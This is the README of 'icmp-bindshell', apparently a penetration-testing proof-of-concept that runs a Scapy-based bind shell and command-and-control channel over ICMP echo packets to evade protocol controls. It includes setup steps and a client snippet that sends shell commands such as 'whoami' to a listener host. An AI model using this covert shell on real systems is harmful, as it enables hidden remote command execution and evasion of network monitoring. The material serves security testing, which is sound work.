This is part of a tutorial written on Medium, please follow the link below for more context.
**[Practical Insider Threat Penetration Testing Cases with Scapy (Shell Code and Protocol Evasion)](https://medium.com/swlh/practical-insider-threat-penetration-testing-cases-with-scapy-shell-code-and-protocol-evasion-e18d43d50da)**

# icmp-bindshell
Experimental python3.x based ICMP bind shell listener using scapy and windows 'compatible'

## README/USAGE:
This is a simple PoC for sending basic C2 over ICMP echo/replies via 'bind' equivalent
The listener has been tested on Python 3.x under Windows within 64 bit python default settings
**Ensure that you do a 'pip install scapy' prior to using the script**
**Modify the sniff listener 'iface=' to be whichever interface you use**

In windows, you can find this under show_interfaces() illustrated below:
>> show_interfaces()
INDEX  IFACE                                           IP               MAC
13     Intel(R) Dual Band Wireless-AC 8265             172.20.20.20     IntelCor:11:22:00

## Client Usage Example:
*Run scapy interactive (aka start > run > cmd.exe > scapy)
command = "whoami"
sendpkt = IP(src="10.10.10.10", dst="20.20.20.20")/ICMP(type=8)/Raw(load=command)
ans, unans = sr(sendpkt, timeout=2)
ans[0]*

### NOTE: Any expected return payload seems to not work well with multi-line returns.
Example findings with this base code:
whoami - returns in icmp response pkt
hostname - returns in icmp response pkt
ipconfig - Returns only a new line in response pkt and '\n' errors in the listening console screen
ping foo.com - Returns empty in response pkt with payload on the listening console screen


*This software provides no expressed warranty or liability for use and is licensed under GPLv2
Dennis Chow dchow[AT]xtecsystems.com
www.scissecurity.com*

![example](https://github.com/dc401/icmp-bindshell/raw/master/icmp-shellcode-experimental.png)
